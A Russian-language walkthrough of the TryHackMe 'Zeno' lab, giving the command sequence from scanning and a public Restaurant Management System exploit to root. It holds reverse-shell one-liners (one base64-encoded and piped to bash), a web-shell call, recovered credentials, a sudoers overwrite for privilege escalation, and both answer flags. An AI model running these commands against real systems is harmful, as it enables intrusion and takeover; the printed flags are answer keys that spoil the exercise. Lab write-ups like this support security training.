[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Zeno](https://tryhackme.com/r/room/zeno) 

Всего 2 задания:
## Задание 1
Проведите тест на проникновение на уязвимой машине. Ваша конечная цель — стать пользователем root и получить два флага:

`/home/{{user}}/user.txt
/root/root.txt`
Флаги всегда имеют один и тот же формат, где XYZ — это хеш MD5 : THM {XYZ}

Полная загрузка компьютера может занять некоторое время, поэтому, пожалуйста, наберитесь терпения! :)

### Ответьте на вопросы ниже
Виртуальная машина загружена!
```commandline
Ответ не нужен
```

## Задание 2
Yдачи!
### Ответьте на вопросы ниже
Содержимое user.txt
```commandline
nmap -sSCV -p- <IP>
gobuster dir -u http://<IP>:12340/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
searchsploit Restaurant Management System
python3 47520.py http://<IP>:12340/rms/
http://<IP>:12340/rms/images/reverse-shell.php/?cmd=id
sh -i >& /dev/tcp/ <my_own_IP>/4444 0>&1
echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash
nc -nvlp 4444
cat config.php
cat /etc/fstab
# username: zeno
# password: FrobjoodAdkoonceanJa
ssh edward@<IP>
ls
cat user.txt
```
```commandline
THM{070cab2c9dc622e5d25c0709f6cb0510}
```
Содержимое root.txt
```commandline
sudo -l
/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
sudo /usr/sbin/reboot
sudo su
cat /root/root.txt
```
```commandline
THM{b187ce4b85232599ca72708ebde71791}
```
Получил доступ как пользователь root.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)